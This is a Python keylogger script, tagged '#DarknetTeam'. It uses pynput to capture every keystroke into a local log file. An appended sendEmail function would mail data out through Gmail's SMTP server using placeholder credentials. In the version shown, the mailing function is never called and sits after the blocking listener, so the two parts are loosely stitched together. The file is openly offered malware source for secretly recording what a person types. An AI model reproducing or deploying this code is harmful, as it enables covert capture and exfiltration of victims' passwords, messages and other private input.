from pynput import keyboard
import os

# Path to save the log file
log_file = "keylog.txt"  # Can be changed to an absolute path, e.g., "C:\\Users\\YourUsername\\Desktop\\keylog.txt"

# Variables to store temporary keys and message
keys = []
message = ""

# Function to handle key press events
def on_press(key):
    global message
    try:
        # Append key to the list
        keys.append(str(key))
        
        # Process the key to build the message
        k = str(key).replace("'", "")  # Remove single quotes
        if k == "Key.space":
            k = " "  # Replace space key with a space character
        elif "Key" in k:  # Ignore special keys
            k = ""
        message += k
        
        # Print message to console for debugging (can be removed if not needed)
        print(message)
        
        # Write processed key to file
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(k)
            
    except Exception as e:
        print(f"Error: {e}")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:  # Stop keylogger when ESC is pressed
        return False

# Create a listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


#DarknetTeam
import smtplib, ssl

def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587 
    sender_email = "your - email - here"
    password = "enter your password"
    receiver_email = "your - email - here"

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server,port)
        server.ehlo() 
        server.starttls(context=context) 
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
       
    except Exception as e:
        print(e)
    finally:
        server.quit()